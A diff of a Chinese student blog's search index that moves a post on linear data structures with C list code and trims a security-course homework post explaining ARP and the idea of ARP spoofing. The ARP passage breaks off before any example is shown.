class="built_in">printf</span>(<span class="string">&quot;not exist!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (q = slist-&gt;n - <span class="number">1</span>; q &gt;= p; q--)<span class="comment">/*插入位置以及之后的元素后移*/</span></span><br><span class="line">        slist-&gt;elem[q + <span class="number">1</span>] = slist-&gt;elem[q];</span><br><span class="line">    slist-&gt;elem[p] = x;  <span class="comment">/*插入元素x*/</span></span><br><span class="line">    slist-&gt;n = slist-&gt;n + <span class="number">1</span>;  <span class="comment">/*顺序表长度加1*/</span></span><br><span class="line">    <span class="keyword">return</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print</span><span class="params">(SeqList slist)</span><span class="comment">//打印顺序表</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; slist-&gt;n; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, slist-&gt;elem[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">DelIndex_seq</span><span class="params">(SeqList slist, <span class="type">int</span> p)</span> <span class="comment">//删除下标为p的元素</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> q;</span><br><span class="line">    <span class="keyword">if</span> (p &lt; <span class="number">0</span> || p &gt;= slist-&gt;n) &#123;<span class="comment">//不存在下标为p的元素</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Not exist\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (q = p; q &lt; slist-&gt;n - <span class="number">1</span>; q++) &#123; <span class="comment">//p位置之后的元素向前移动</span></span><br><span class="line">        slist-&gt;elem[q] = slist-&gt;elem[q + <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    slist-&gt;n = slist-&gt;n - <span class="number">1</span>; <span class="comment">//顺序表长度减1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">```</span><br></pre></td></tr></table></figure>
-
-<h3 id="链式线性表-单链表"><a href="#链式线性表-单链表" class="headerlink" title="链式线性表-单链表"></a>链式线性表-单链表</h3><p>其中的元素的储存位置是任意的，具体位置在程序运行时动态分布。其在物理位置上相邻元素并不相邻。</p>
-<blockquote>
-<p>存储分配：</p>
-<ul>
-<li>顺序 -&gt; 一段地址连续的存储空间</li>
-<li>链式 -&gt; 任意地址存储空间</li>
-</ul>
-<p>时间：</p>
-<ul>
-<li>查找 顺序 -&gt; O(1) 链式 -&gt; O(n)</li>
-<li>插入和删除 顺序 -&gt; O(n) 链式 -&gt; 寻找相应的节点，时间复杂度为O(n)，然后，插入和&gt; &gt;删除为O(1)</li>
-</ul>
-<p>空间：</p>
-<ul>
-<li><p>顺序 -&gt; 需要提前分配存储空间，分配大了，浪费空间，分配小了，容易发生上溢</p>
-</li>
-<li><p>链式 -&gt; 不需要提前分配空间，只要有存储空间分配就行，数据元素个数只受可分配存储空间&gt; 大小的限制</p>
-</li>
-</ul>
-</blockquote>
-<p>以下是其基本功能</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//判断head指针是否为空</span></span><br><span class="line">LinkList <span class="title function_">SetNullList_Link</span><span class="params">()</span> </span><br><span class="line">&#123;</span><br><span class="line">    LinkList head = (LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Node));</span><br><span class="line">    <span class="keyword">if</span> (head != <span class="literal">NULL</span>) head-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;alloc failure&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> head; </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//创建单链表--&gt;尾插法</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">CreateList_Tail</span><span class="params">(<span class="keyword">struct</span> Node* head)</span></span><br><span class="line">&#123;</span><br><span class="line">    PNode p = <span class="literal">NULL</span>;</span><br><span class="line">    PNode q = head;</span><br><span class="line">    DataType data;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;data);</span><br><span class="line">    <span class="keyword">while</span> (data != <span class="number">-1</span>)</span><br><span class="line">    &#123;   </span><br><span class="line">        p = (<span class="keyword">struct</span> Node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Node));</span><br><span class="line">        p-&gt;data = data;</span><br><span class="line">        p-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">        q-&gt;next = p;</span><br><span class="line">        q = p;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">InsertPre_link</span><span class="params">(LinkList llist,LinkList p, DataType x)</span>&#123;</span><br><span class="line">    LinkList pre=llist,q=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">while</span>(pre-&gt;next!= p)&#123;</span><br><span class="line">        pre=pre-&gt;next;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    q=(LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LinkList));</span><br><span class="line">    q-&gt;data=x;</span><br><span class="line">    q-&gt;next=p;</span><br><span class="line">    pre-&gt;next=q;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">InsertPost_link_value</span><span class="params">(LinkList head,<span class="type">int</span> finddata,<span class="type">int</span> insertdata)</span>&#123;</span><br><span class="line">    LinkList p=head;</span><br><span class="line">    <span class="keyword">while</span>(p-&gt;data!=finddata)&#123;</span><br><span class="line">        p=p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    InsertPre_link(head,p,insertdata);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//打印单链表</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">print</span><span class="params">(LinkList head)</span>   </span><br><span class="line">&#123;</span><br><span class="line">    PNode  p = head-&gt;next;</span><br><span class="line">    <span class="keyword">while</span> (p)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, p-&gt;data);</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//删除单链表并释放空间</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">DestoryList_Link</span><span class="params">(LinkList head)</span>  </span><br><span class="line">&#123;</span><br><span class="line">    PNode  pre = head; </span><br><span class="line">    PNode p = pre-&gt;next;</span><br><span class="line">    <span class="keyword">while</span> (p)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">free</span>(pre);</span><br><span class="line">        pre = p;</span><br><span class="line">        p = pre-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(pre);</span><br><span class="line">&#125;```</span><br></pre></td></tr></table></figure>
-
-<h3 id="单循环链表"><a href="#单循环链表" class="headerlink" title="单循环链表"></a>单循环链表</h3><p>在单链表的基础上将最后一个节点的指针指向链表的第一个节点，形成一个环，称之为单循环链表。</p>
-<p><img src="/2023/11/01/%E7%BA%BF%E6%80%A7%E7%BB%93%E6%9E%84%E6%80%BB%E7%BB%93/OIP-16982375857111.jpg" alt="OIP"></p>
-<h3 id="双链表和双循环链表"><a href="#双链表和双循环链表" class="headerlink" title="双链表和双循环链表"></a>双链表和双循环链表</h3><h4 id="双链表"><a href="#双链表" class="headerlink" title="双链表"></a>双链表</h4><p>存在钱去和后继</p>
-<blockquote>
-<p>优点</p>
-<ul>
-<li>可以实现双向查找<br>缺点</li>
-<li>需要额外的储存空间存放前驱节点</li>
-</ul>
-</blockquote>
-<h4 id="双循环链表"><a href="#双循环链表" class="headerlink" title="双循环链表"></a>双循环链表</h4><p>把双链表的最后的一个节点的后继指针指向第一个节点，把第一个节点的前驱指针指向最后一个节点，就组成了双循环链表。</p>
-<p><img src="/2023/11/01/%E7%BA%BF%E6%80%A7%E7%BB%93%E6%9E%84%E6%80%BB%E7%BB%93/225854.jpg" alt="双链表"></p>
-<h3 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h3><p><strong>栈</strong>（英语：stack）又称为<strong>堆栈</strong>或<strong>堆叠，</strong>栈作为一种数据结构，是一种只能在一端进行插入和删除操作的特殊线性表。它按照先进后出的原则存储数据，先进入的数据被压入栈底，最后的数据在栈顶，需要读数据的时候从栈顶开始弹出数据（最后一个数据被第一个读出来）。栈具有记忆作用，对栈的插入与删除操作中，不需要改变栈底指针。</p>
-<ul>
-<li><strong>定义</strong>：只允许在一端进行插入或删除的线性表</li>
-<li><strong>栈顶（top）</strong> ：允许进行插入或删除的一端</li>
-<li><strong>栈底（bottom）:</strong> 与栈顶相对应的一端</li>
-<li><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/b1128b4101604e1890d3f7dd2d655039~tplv-k3u1fbpfcp-zoom-in-crop-mark:1512:0:0:0.awebp" alt="img"></li>
-<li><strong>特点：</strong> 先进后出</li>
-</ul>
-<p>包含顺序栈，双栈等</p>
-<h3 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h3><p>队列是一种特殊的<code>线性表</code>，特殊之处在于它只允许在表的<code>前端（front）</code>进行删除操作，而在表的<code>后端（rear）</code>进行插入操作，和栈一样，队列是一种<code>操作受限制</code>的线性表。进行插入操作的端称为<code>队尾</code>，进行删除操作的端称为<code>队头</code>。</p>
-]]></content>
-      <categories>
-        <category>C语言</category>
-      </categories>
-      <tags>
-        <tag>C语言,数据结构,线性表</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>内网穿透一</title>
     <url>/2023/12/10/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/</url>
     <content><![CDATA[<h2 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h2><p>在一次场景搭建（其概念图大致为：以liunx-1做跳板机，进入win10-1,在从win10-1访问与之相连的win7-1的80端口和linux-2的21端口）。在主机渗透时使用msf攻击时，若要访问win10,win7主机需要配置相关路由，因此要掌握内网穿透的知识。</p>
@@ -1070,6 +1058,82 @@ DNS历史查询：（https://securitytrails.com/）
       </tags>
   </entry>
   <entry>
+    <title>线性结构总结</title>
+    <url>/2023/11/01/%E7%BA%BF%E6%80%A7%E7%BB%93%E6%9E%84%E6%80%BB%E7%BB%93/</url>
+    <content><![CDATA[<h1 id="线性结构总结"><a href="#线性结构总结" class="headerlink" title="线性结构总结"></a>线性结构总结</h1><h2 id="线性表"><a href="#线性表" class="headerlink" title="线性表"></a>线性表</h2><p>线性表是由n&gt;&#x3D;0个性质相同的数据元素组成的有限序列，n为线性长度。</p>
+<p>线性表的主要操作包括创建空线性表，判断线性表是否为空，以及插入，删除和查找等操作。</p>
+<h3 id="顺序表"><a href="#顺序表" class="headerlink" title="顺序表"></a>顺序表</h3><p>顺序表是用一组地址连续的储存单元依次储线性表中的各个元素，通过位置来表示数据元素之间的线性逻辑关系。</p>
+<p>顺序表的相邻元素在物理位置上也是相邻的。</p>
+<blockquote>
+<p>优点：</p>
+<ul>
+<li>可以快速获取下标的数据元素，时间复杂度为O(1)</li>
+<li>逻辑关系是一对一的关系，连续存储单元足以储存，不需要增加额外的存储空间</li>
+</ul>
+<p>缺点：</p>
+<ul>
+<li>插入和删除操作需要移动大量的元素，时间复杂度为O(n)</li>
+<li>线性表的存储空间大小难以确定，并且不好扩展</li>
+<li>造成存储空间碎片化</li>
+</ul>
+</blockquote>
+<p>  以下为顺序表的基本功能</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    SeqList slist = (SeqList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> List)); <span class="comment">/*申请结构体List空间*/</span></span><br><span class="line">    <span class="keyword">if</span> (slist != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        slist-&gt;elem = (DataType*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(DataType) * m);</span><br><span class="line">        <span class="comment">/*申请顺序表空间，大小为m个DataType空间*/</span></span><br><span class="line">        <span class="keyword">if</span> (slist-&gt;elem) &#123;</span><br><span class="line">            slist-&gt;Max = m;<span class="comment">/*顺序表的最大值*/</span></span><br><span class="line">            slist-&gt;n = <span class="number">0</span>; <span class="comment">/*顺序表长度赋值为0*/</span></span><br><span class="line">            <span class="keyword">return</span>(slist);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="built_in">free</span>(slist);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;out of space!!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">IsNullList_seq</span><span class="params">(SeqList slist)</span><span class="comment">/*判断顺序表是否为空*/</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span>(slist-&gt;n == <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">InsertPre_seq</span><span class="params">(SeqList slist, <span class="type">int</span> p, DataType x)</span></span><br><span class="line"><span class="comment">/*在线性表slist的p位置之前插入x*/</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> q;</span><br><span class="line">    <span class="keyword">if</span> (slist-&gt;n &gt;= slist-&gt;Max) &#123; <span class="comment">/*顺序表满溢出*/</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;overflow&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (p&lt;<span class="number">0</span> || p&gt;slist-&gt;n) &#123;  <span class="comment">/*不存在下标为p的元素*/</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;not exist!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (q = slist-&gt;n - <span class="number">1</span>; q &gt;= p; q--)<span class="comment">/*插入位置以及之后的元素后移*/</span></span><br><span class="line">        slist-&gt;elem[q + <span class="number">1</span>] = slist-&gt;elem[q];</span><br><span class="line">    slist-&gt;elem[p] = x;  <span class="comment">/*插入元素x*/</span></span><br><span class="line">    slist-&gt;n = slist-&gt;n + <span class="number">1</span>;  <span class="comment">/*顺序表长度加1*/</span></span><br><span class="line">    <span class="keyword">return</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print</span><span class="params">(SeqList slist)</span><span class="comment">//打印顺序表</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; slist-&gt;n; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, slist-&gt;elem[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">DelIndex_seq</span><span class="params">(SeqList slist, <span class="type">int</span> p)</span> <span class="comment">//删除下标为p的元素</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> q;</span><br><span class="line">    <span class="keyword">if</span> (p &lt; <span class="number">0</span> || p &gt;= slist-&gt;n) &#123;<span class="comment">//不存在下标为p的元素</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Not exist\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (q = p; q &lt; slist-&gt;n - <span class="number">1</span>; q++) &#123; <span class="comment">//p位置之后的元素向前移动</span></span><br><span class="line">        slist-&gt;elem[q] = slist-&gt;elem[q + <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    slist-&gt;n = slist-&gt;n - <span class="number">1</span>; <span class="comment">//顺序表长度减1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">```</span><br></pre></td></tr></table></figure>
+
+<h3 id="链式线性表-单链表"><a href="#链式线性表-单链表" class="headerlink" title="链式线性表-单链表"></a>链式线性表-单链表</h3><p>其中的元素的储存位置是任意的，具体位置在程序运行时动态分布。其在物理位置上相邻元素并不相邻。</p>
+<blockquote>
+<p>存储分配：</p>
+<ul>
+<li>顺序 -&gt; 一段地址连续的存储空间</li>
+<li>链式 -&gt; 任意地址存储空间</li>
+</ul>
+<p>时间：</p>
+<ul>
+<li>查找 顺序 -&gt; O(1) 链式 -&gt; O(n)</li>
+<li>插入和删除 顺序 -&gt; O(n) 链式 -&gt; 寻找相应的节点，时间复杂度为O(n)，然后，插入和&gt; &gt;删除为O(1)</li>
+</ul>
+<p>空间：</p>
+<ul>
+<li><p>顺序 -&gt; 需要提前分配存储空间，分配大了，浪费空间，分配小了，容易发生上溢</p>
+</li>
+<li><p>链式 -&gt; 不需要提前分配空间，只要有存储空间分配就行，数据元素个数只受可分配存储空间&gt; 大小的限制</p>
+</li>
+</ul>
+</blockquote>
+<p>以下是其基本功能</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//判断head指针是否为空</span></span><br><span class="line">LinkList <span class="title function_">SetNullList_Link</span><span class="params">()</span> </span><br><span class="line">&#123;</span><br><span class="line">    LinkList head = (LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Node));</span><br><span class="line">    <span class="keyword">if</span> (head != <span class="literal">NULL</span>) head-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;alloc failure&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> head; </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//创建单链表--&gt;尾插法</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">CreateList_Tail</span><span class="params">(<span class="keyword">struct</span> Node* head)</span></span><br><span class="line">&#123;</span><br><span class="line">    PNode p = <span class="literal">NULL</span>;</span><br><span class="line">    PNode q = head;</span><br><span class="line">    DataType data;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;data);</span><br><span class="line">    <span class="keyword">while</span> (data != <span class="number">-1</span>)</span><br><span class="line">    &#123;   </span><br><span class="line">        p = (<span class="keyword">struct</span> Node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Node));</span><br><span class="line">        p-&gt;data = data;</span><br><span class="line">        p-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">        q-&gt;next = p;</span><br><span class="line">        q = p;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">InsertPre_link</span><span class="params">(LinkList llist,LinkList p, DataType x)</span>&#123;</span><br><span class="line">    LinkList pre=llist,q=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">while</span>(pre-&gt;next!= p)&#123;</span><br><span class="line">        pre=pre-&gt;next;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    q=(LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LinkList));</span><br><span class="line">    q-&gt;data=x;</span><br><span class="line">    q-&gt;next=p;</span><br><span class="line">    pre-&gt;next=q;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">InsertPost_link_value</span><span class="params">(LinkList head,<span class="type">int</span> finddata,<span class="type">int</span> insertdata)</span>&#123;</span><br><span class="line">    LinkList p=head;</span><br><span class="line">    <span class="keyword">while</span>(p-&gt;data!=finddata)&#123;</span><br><span class="line">        p=p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    InsertPre_link(head,p,insertdata);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//打印单链表</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">print</span><span class="params">(LinkList head)</span>   </span><br><span class="line">&#123;</span><br><span class="line">    PNode  p = head-&gt;next;</span><br><span class="line">    <span class="keyword">while</span> (p)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, p-&gt;data);</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//删除单链表并释放空间</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">DestoryList_Link</span><span class="params">(LinkList head)</span>  </span><br><span class="line">&#123;</span><br><span class="line">    PNode  pre = head; </span><br><span class="line">    PNode p = pre-&gt;next;</span><br><span class="line">    <span class="keyword">while</span> (p)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">free</span>(pre);</span><br><span class="line">        pre = p;</span><br><span class="line">        p = pre-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(pre);</span><br><span class="line">&#125;```</span><br></pre></td></tr></table></figure>
+
+<h3 id="单循环链表"><a href="#单循环链表" class="headerlink" title="单循环链表"></a>单循环链表</h3><p>在单链表的基础上将最后一个节点的指针指向链表的第一个节点，形成一个环，称之为单循环链表。</p>
+<p><img src="/2023/11/01/%E7%BA%BF%E6%80%A7%E7%BB%93%E6%9E%84%E6%80%BB%E7%BB%93/OIP-16982375857111.jpg" alt="OIP"></p>
+<h3 id="双链表和双循环链表"><a href="#双链表和双循环链表" class="headerlink" title="双链表和双循环链表"></a>双链表和双循环链表</h3><h4 id="双链表"><a href="#双链表" class="headerlink" title="双链表"></a>双链表</h4><p>存在钱去和后继</p>
+<blockquote>
+<p>优点</p>
+<ul>
+<li>可以实现双向查找<br>缺点</li>
+<li>需要额外的储存空间存放前驱节点</li>
+</ul>
+</blockquote>
+<h4 id="双循环链表"><a href="#双循环链表" class="headerlink" title="双循环链表"></a>双循环链表</h4><p>把双链表的最后的一个节点的后继指针指向第一个节点，把第一个节点的前驱指针指向最后一个节点，就组成了双循环链表。</p>
+<p><img src="/2023/11/01/%E7%BA%BF%E6%80%A7%E7%BB%93%E6%9E%84%E6%80%BB%E7%BB%93/225854.jpg" alt="双链表"></p>
+<h3 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h3><p><strong>栈</strong>（英语：stack）又称为<strong>堆栈</strong>或<strong>堆叠，</strong>栈作为一种数据结构，是一种只能在一端进行插入和删除操作的特殊线性表。它按照先进后出的原则存储数据，先进入的数据被压入栈底，最后的数据在栈顶，需要读数据的时候从栈顶开始弹出数据（最后一个数据被第一个读出来）。栈具有记忆作用，对栈的插入与删除操作中，不需要改变栈底指针。</p>
+<ul>
+<li><strong>定义</strong>：只允许在一端进行插入或删除的线性表</li>
+<li><strong>栈顶（top）</strong> ：允许进行插入或删除的一端</li>
+<li><strong>栈底（bottom）:</strong> 与栈顶相对应的一端</li>
+<li><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/b1128b4101604e1890d3f7dd2d655039~tplv-k3u1fbpfcp-zoom-in-crop-mark:1512:0:0:0.awebp" alt="img"></li>
+<li><strong>特点：</strong> 先进后出</li>
+</ul>
+<p>包含顺序栈，双栈等</p>
+<h3 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h3><p>队列是一种特殊的<code>线性表</code>，特殊之处在于它只允许在表的<code>前端（front）</code>进行删除操作，而在表的<code>后端（rear）</code>进行插入操作，和栈一样，队列是一种<code>操作受限制</code>的线性表。进行插入操作的端称为<code>队尾</code>，进行删除操作的端称为<code>队头</code>。</p>
+]]></content>
+      <categories>
+        <category>C语言</category>
+      </categories>
+      <tags>
+        <tag>C语言,数据结构,线性表</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>网络安全测试课程_作业_1</title>
     <url>/2023/11/08/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%AF%BE%E7%A8%8B-%E4%BD%9C%E4%B8%9A-1/</url>
     <content><![CDATA[<h2 id="网络安全测试课程-作业一"><a href="#网络安全测试课程-作业一" class="headerlink" title="网络安全测试课程_作业一"></a>网络安全测试课程_作业一</h2><h3 id="VM下虚拟机网络配置信息"><a href="#VM下虚拟机网络配置信息" class="headerlink" title="VM下虚拟机网络配置信息"></a>VM下虚拟机网络配置信息</h3><p>VM下的虚拟机网络信息不同于PVE下的网络配置信息（PVE下多为vmbr0(0为编号)下的桥接模式）。</p>
@@ -1224,93 +1288,6 @@ icp="京ICP证030173号"：查找备案号为“京ICP证030173号的网站<p></
       </tags>
   </entry>
   <entry>
-    <title>网络安全测试课程-作业-4</title>
-    <url>/2023/11/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%AF%BE%E7%A8%8B-%E4%BD%9C%E4%B8%9A-4/</url>
-    <content><![CDATA[<h2 id="ARP"><a href="#ARP" class="headerlink" title="ARP"></a>ARP</h2><h4 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a>ARP协议</h4><ul>
-<li><p>arp（Address Resolution Protocol），即地址解析协议，属于<strong>数据链路层</strong>，是根据IP地址获取物理地址的一个TCP&#x2F;IP协议。</p>
-</li>
-<li><p>cmd查看arp -a</p>
-<blockquote>
-<p>在以太网中，同一局域网中的一台主机想要和另一台主机进行直接通信，必须要知道目标主机的MAC地址。而在TCP&#x2F;IP协议中，网络层和传输层只关心目标主机的IP地址。这就导致在以太网中使用IP协议时，数据链路层的以太网协议含有的上层IP协议提供的数据中，只包含目的主机的IP地址。所以需要一种方法，根据目的主机的IP地址，获得其MAC地址。这就是ARP协议要做的事情。所谓地址解析（address resolution）就是主机在发送帧前将目标IP地址转换成目标MAC地址的过程。</p>
-</blockquote>
-</li>
-</ul>
-<p><img src="/2023/11/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%AF%BE%E7%A8%8B-%E4%BD%9C%E4%B8%9A-4/image-20231127102741981.png" alt="1"></p>
-<ul>
-<li><p>每一个主机都有一个ARP高速缓存，此缓存中记录了最近一段时间内其它IP地址与其MAC地址的对应关系。ARP高速缓存是实时更新的，每次开机后会清空缓存并重新获取。</p>
-</li>
-<li><p>如果本机想与某台主机通信，则首先在ARP高速缓存(动态更新)中查找此台主机的IP和MAC信息，如果存在，则直接利用此MAC地址构造以太帧；如果不存在，主机发送信息时将包含目标IP地址的ARP请求广播到局域网络上的所有主机，并接收返回消息，以此确定目标的物理地址；收到返回消息后将该IP地址和物理地址存入本机ARP缓存中并保留一定时间。</p>
-</li>
-<li><p><img src="/2023/11/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%AF%BE%E7%A8%8B-%E4%BD%9C%E4%B8%9A-4/%7B89D8FD6A-F64C-40cb-900F-6AC24E460C6B%7D.png" alt="2"></p>
-<p>​      																	ARP请求广播到局域网络上的所有主机</p>
-<h4 id="ARP表"><a href="#ARP表" class="headerlink" title="ARP表"></a>ARP表</h4></li>
-</ul>
-<p>网络设备一般都有一个ARP缓存（ARP Cache），ARP缓存用来存放IP地址和MAC地址的关联信息。在数据传送前，设备会先查找ARP缓存表。如果缓存表中存在对方设备的MAC地址，则直接采用该MAC地址来封装帧，然后将帧发送出去。如果缓存表中不存在相应的信息，则通过发送ARP 报文来获取。获取到的IP地址和MAC地址的映射关系会被放入ARP缓存表中存放一段时间。在有效期（一般为关机前）内，设备可以直接从这个表中查找目的MAC地址来进行数据封装，而无需进行ARP查询。过了这段有效期，ARP表现会被自动删除。如果目标设备位于其他网络则源设备会在ARP缓存表中查找网关的MAC地址，然后将数据发送给网关，网关再把数据转发给目的设备。</p>
-<p><img src="/2023/11/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%AF%BE%E7%A8%8B-%E4%BD%9C%E4%B8%9A-4/%7BADEF15EC-3ABE-49ea-9D9B-24F7D6E58772%7D.png" alt="3"></p>
-<h4 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h4><p>当有2台或者多台计算机进行交互时，例如主机A与主机B进行交互，A在已知B的IP，但不知到B的MAC地址时，是无法通信的。</p>
-<p>当A主机上在查询Arp缓存时未能找到B的MAC地址时，会进行广播到本地网络上的所有主机（发送的数据包含A的Ip与MAC地址），主机B的IP与广播中所请求的IP地址相同时，主机B将A的IP地址和MAC地址映射添加到本地ARP缓存中。同时主机B将包含其MAC地址的ARP回复消息直接发送回主机A。当主机A收到从主机B发来的ARP回复消息时，会用主机B的IP和MAC地址映射更新ARP缓存。</p>
-<p>此时，由于主机A并不会验证B发送的回复包是否具有真实性，因此我们可以伪造成B发送回复包。例如:</p>
